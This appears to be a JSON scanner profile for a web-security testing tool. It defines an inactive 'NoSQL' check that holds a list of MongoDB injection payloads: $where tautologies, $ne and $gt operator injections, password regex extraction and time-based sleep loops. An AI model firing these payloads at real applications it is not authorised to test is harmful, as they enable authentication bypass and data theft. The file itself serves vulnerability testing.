[
 {
  "Name": "NoSQL", 
  "Active": false, 
  "Scanner": 1, 
  "Payloads": [
   "true, $where: '1 == 1'", 
   ", $where: '1 == 1'", 
   "$where: '1 == 1'", 
   "', $where: '1 == 1'", 
   "1, $where: '1 == 1'", 
   "{ $ne: 1 }", 
   "', $or: [ {}, { 'a':'a", 
   "' } ], $comment:'successful MongoDB injection'", 
   "db.injection.insert({success:1});", 
   "db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1", 
   "|| 1==1", 
   "' && this.password.match(/.*/)//+%00", 
   "' && this.passwordzz.match(/.*/)//+%00", 
   "'%20%26%26%20this.password.match(/.*/)//+%00", 
   "'%20%26%26%20this.passwordzz.match(/.*/)//+%00", 
   "{$gt: ''}", 
   "[$ne]=1", 
   "';sleep(5000);", 
   "';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);"
  ], 
  "Encoder": [], 
  "UrlEncode": false, 
  "CharsToUrlEncode": "", 
  "Grep": [
   "error"
  ], 
  "PayloadResponse": false, 
  "NotResponse": false, 
  "NotCookie": false, 
  "TimeOut": 0, 
  "isTime": false, 
  "CaseSensitive": false, 
  "isReplace": false, 
  "ExcludeHTTP": false, 
  "OnlyHTTP": false, 
  "IsContentType": false, 
  "ContentType": "", 
  "NegativeCT": false, 
  "IsResponseCode": false, 
  "ResponseCode": "", 
  "NegativeRC": false, 
  "MatchType": 1, 
  "RedirType": 0, 
  "MaxRedir": 0, 
  "rCookies": false, 
  "spaceEncode": false, 
  "payloadPosition": 0, 
  "IssueName": "NoSQL", 
  "IssueSeverity": "Information", 
  "IssueConfidence": "Certain", 
  "IssueDetail": "NoSQL\n\n<grep>", 
  "RemediationDetail": "", 
  "IssueBackground": "", 
  "RemediationBackground": ""
 }
]